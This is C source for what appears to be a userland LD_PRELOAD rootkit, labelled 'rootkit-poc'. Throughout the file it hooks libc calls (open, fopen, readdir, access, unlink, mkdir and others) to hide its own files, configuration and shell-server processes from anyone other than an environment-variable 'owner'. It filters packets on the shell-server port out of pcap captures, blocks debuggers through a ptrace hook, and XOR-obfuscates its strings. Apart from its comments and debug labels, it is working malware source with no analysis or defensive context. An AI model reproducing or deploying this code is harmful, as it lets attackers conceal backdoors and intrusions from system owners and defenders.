#define _GNU_SOURCE // Activates all GNU C Library extensions

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <dlfcn.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <dirent.h>
#include <errno.h>
#include <stdbool.h>
#include <unistd.h>
#include <sys/wait.h>
#include <utmp.h>
#include <termios.h>
#include <sys/ioctl.h>
#include <signal.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <pty.h>
#include <unistd.h>
#include <pcap/pcap.h>

#include "etc.h"
#include "libshserver.h"

// Set up syscall hooks
void init(void) {
    DEBUG("[rootkit-poc]: init called\n");

    if (is_loaded) {
        return;
    }

    for (int i = 0; i < SYSCALL_SIZE; ++i) {
        char *scallname = strdup(syscall_table[i]); // duplicates the syscall name

        xor(scallname); // decode

        strncpy(syscall_list[i].syscall_name, scallname, 50); // copy the name to the structure
        syscall_list[i].syscall_name[50] = '\0'; // null-terminated

        syscall_list[i].syscall_func = dlsym(RTLD_NEXT, scallname); // gets the pointer to the original syscall function

        cleanup(scallname, strlen(scallname)); // clears allocated memory
    }

    is_loaded = 1;
}

int is_owner(void) {
    init(); // hook configurations

    if (owner) {
        return owner;
    }

    char *hide_term_str = strdup(HIDE_TERM_STR);

    xor(hide_term_str);

    char *hide_term_var = getenv(hide_term_str);

    if (hide_term_var != NULL) {
        owner = 1;
    } else {
        owner = 0;
    }

    cleanup(hide_term_str, strlen(hide_term_str));

    return owner;
}

int is_invisible(const char *path) {
    if (is_owner()) {
        return 0;
    }

    char *config_file = strdup(CONFIG_FILE);
    char *bin_file = strdup(BIN_FILE);
    char *shell_server = strdup(SHELL_SERVER);

    xor(config_file);
    xor(bin_file);
    xor(shell_server);

    // Checks if the path contains the MAGIC_STRING
    if (strstr(path, MAGIC_STRING)
        || strstr(path, shell_server)
        || strstr(path, config_file)
        || strstr(path, bin_file)) {
        cleanup(config_file, strlen(config_file));
        cleanup(bin_file, strlen(bin_file));
        cleanup(shell_server, strlen(shell_server));
        return 1; // invisible
    }

    struct stat s_fstat;
    char line[MAX_LEN];
    char p_path[PATH_MAX];
    char *proc_path = strdup(PROC_PATH);
    FILE *cmd;
    int fd;

    xor(proc_path);

    if (strstr(path, proc_path)) {
        cleanup(proc_path, strlen(proc_path));

        char *cmd_proc_name = strdup(CMD_PROC_NAME);

        xor(cmd_proc_name);

        snprintf(p_path, PATH_MAX, cmd_proc_name, extract_pid(path));

        cleanup(cmd_proc_name, strlen(cmd_proc_name));

        cmd = syscall_list[SYS_FOPEN].syscall_func(p_path, "r");

        if (cmd) {
            int res;
            char *step = &line[0];

            while ((res=fgets(line, MAX_LEN, cmd) != NULL)) {
                if (strstr(line, shell_server)) {
                    cleanup(config_file, strlen(config_file));
                    cleanup(bin_file, strlen(bin_file));
                    cleanup(shell_server, strlen(shell_server));
                    return 1;
                }

                memset(line, 0x00, MAX_LEN);
					  }

            fclose(cmd);
        }
    } else {
        cleanup(proc_path, strlen(proc_path));
    }

    cleanup(shell_server, strlen(shell_server));
    cleanup(config_file, strlen(config_file));
    cleanup(bin_file, strlen(bin_file));

    return 0; // visible
}

void packet_handler(u_char *args, const struct pcap_pkthdr *header, const u_char *packet) {
    const struct sniff_ip *ip;
    const struct sniff_tcp *tcp;

    int size_ip;
    int size_tcp;
    int sport,dport;

    // IP header offset
    ip = (struct sniff_ip*)(packet + SIZE_ETHERNET);
    size_ip = IP_HL(ip) * 4;
    if (size_ip < 20) {
        return; // invalid IP header length
    }

    switch (ip->ip_p) {
        case IPPROTO_TCP:
            // noop
            break;
        default:
            if (old_pcap_callback) {
                old_pcap_callback(args, header, packet);
            }

            return;
    }

    // TCP header offset
    tcp = (struct sniff_tcp*)(packet + SIZE_ETHERNET + size_ip);
    size_tcp = TH_OFF(tcp) * 4;
    if (size_tcp < 20) {
        return; // invalid TCP header length
    }

    sport = htons(tcp->th_sport);
    dport = htons(tcp->th_dport);

    if ((sport == SHELL_SERVER_PORT) || (dport == SHELL_SERVER_PORT)) {
        return; // hide traffic
    } else {
        if (old_pcap_callback) {
            old_pcap_callback(args, header, packet);
        }
    }

    return;
}

// Hooked ptrace function to exit on debug
long ptrace(void *request, pid_t pid, void *addr, void *data) {
    char *anti_debug_msg = strdup(ANTI_DEBUG_MSG);

    xor(anti_debug_msg);

    printf("%s\n", anti_debug_msg);

    cleanup(anti_debug_msg, strlen(anti_debug_msg));

    exit(-1);
}

// Hooked access function to hide invisible files
int access(const char *path, int mode) {
    DEBUG("[rootkit-poc]: access hooked\n");

    if (is_invisible(path)) {
        errno = ENOENT;
        return -1;
    }

    // Calls the original access function if the file is visible
    return (long) syscall_list[SYS_ACCESS].syscall_func(path, mode);
}

// Hooked readdir function to hide invisible directory entries
struct dirent *readdir(DIR *dirp) {
    DEBUG("[rootkit-poc]: readdir hooked\n");

    struct dirent *dir;

    do {
        dir = syscall_list[SYS_READDIR].syscall_func(dirp);

        // Checks if the entry is not NULL and if it is “.” or “..”
        if (dir != NULL && (strcmp(dir->d_name,".") == 0 || strcmp(dir->d_name,"..") == 0)) {
            continue;
        }
    } while (dir && is_invisible(dir->d_name));

    return dir;
}

// Hooked fopen function to hide invisible files
FILE *fopen(const char *filename, const char *mode) {
    DEBUG("[rootkit-poc]: fopen hooked %s\n", filename);

    if (is_invisible(filename)) {
        errno = ENOENT;
        return NULL;
    }

    return syscall_list[SYS_FOPEN].syscall_func(filename, mode);
}

// Hooked opendir function to hide invisible directories
DIR *opendir(const char *name) {
    DEBUG("[rootkit-poc]: opendir hooked\n");

    if (is_invisible(name)) {
        errno = ENOENT;
        return NULL;
    }

    return syscall_list[SYS_OPENDIR].syscall_func(name);
}

// Hooked open function to hide invisible files
int open(const char *pathname, int flags, mode_t mode) {
    DEBUG("[rootkit-poc]: open hooked\n");

    if (is_invisible(pathname)) {
        errno = ENOENT;
        return -1;
    }

    return (long) syscall_list[SYS_OPEN].syscall_func(pathname, flags, mode);
}

// Hooked mkdir function to hide invisible directories
int mkdir(const char *pathname, mode_t mode) {
    DEBUG("[rootkit-poc]: mkdir hooked\n");

    if (is_invisible(pathname)) {
        errno = EACCES;
        return -1;
    }

    return (long) syscall_list[SYS_MKDIR].syscall_func(pathname, mode);
}

// Hooked mkdirat function to hide invisible directories
int mkdirat(int dirfd, const char *pathname, mode_t mode) {
    DEBUG("[rootkit-poc]: mkdirat hooked\n");

    if (is_invisible(pathname)) {
        errno = EACCES;
        return -1;
    }

    return (long) syscall_list[SYS_MKDIRAT].syscall_func(dirfd, pathname, mode);
}

// Hooked rmdir function to hide invisible directories
int rmdir(const char *pathname) {
    DEBUG("[rootkit-poc]: rmdir hooked\n");

    if (is_invisible(pathname)) {
        errno = ENOENT;
        return -1;
    }

    return (long) syscall_list[SYS_RMDIR].syscall_func(pathname);
}

// Hooked link function to hide invisible files
int link(const char *oldpath, const char *newpath) {
    DEBUG("[rootkit-poc]: link hooked\n");

    if (is_invisible(oldpath)) {
        errno = ENOENT;
        return -1;
    }

    return (long) syscall_list[SYS_LINK].syscall_func(oldpath, newpath);
}

// Hooked unlink function to hide invisible files
int unlink(const char *pathname) {
    DEBUG("[rootkit-poc]: unlink hooked\n");

    if (is_invisible(pathname)) {
        errno = ENOENT;
        return -1;
    }

    return (long) syscall_list[SYS_UNLINK].syscall_func(pathname);
}

// Hooked unlinkat function to hide invisible files
int unlinkat(int dirfd, const char *pathname, int flags) {
    DEBUG("[rootkit-poc]: unlinkat hooked\n");

    if (is_invisible(pathname)) {
        errno = ENOENT;
        return -1;
    }

    return (long) syscall_list[SYS_UNLINKAT].syscall_func(dirfd, pathname, flags);
}

// Hooked pcap_loop function to avoids local sniffing
int pcap_loop(pcap_t *p, int cnt, pcap_handler callback, u_char *user) {
    DEBUG("[rootkit-poc]: pcap_loop hooked\n");

    init(); // hook configurations

    old_pcap_callback = callback;

    return (long) syscall_list[SYS_PCAP_LOOP].syscall_func(p, cnt, packet_handler, user);
}

